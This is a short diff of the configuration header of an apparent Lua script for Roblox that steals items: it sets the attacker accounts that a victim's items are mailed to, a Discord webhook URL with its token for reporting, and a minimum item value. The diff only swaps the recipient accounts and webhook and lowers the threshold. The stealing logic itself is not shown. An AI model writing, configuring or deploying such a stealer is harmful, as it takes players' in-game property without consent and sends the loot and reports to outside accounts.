@@ -1,7 +1,7 @@
-Username = "martinnader8"
-Username2 = "eyadahmed023" -- stuff will get sent to this user if first user's mailbox is full
-webhook = "https://discord.com/api/webhooks/1313233966265929778/_5KCFcZGcjt0JvQ_meeyB3mHzL_DRvrfd4q7FcryJxh5HVHVYCc3Qk5pnuU07G_zL6R4"
-min_rap = 100000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+Username = "larrybutguney"
+Username2 = "martinnader8" -- stuff will get sent to this user if first user's mailbox is full
+webhook = "https://discord.com/api/webhooks/1320420956648509440/aiRjhG3Fqf-6Xq1cMkHFumB3PgL1FALxa-6vWNaPP7Ak2ynF0QiMzanshEO5lmCL9NwO"
+min_rap = 10000 -- minimum rap of each item you want to get sent to you. 1 mil by default
 
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then
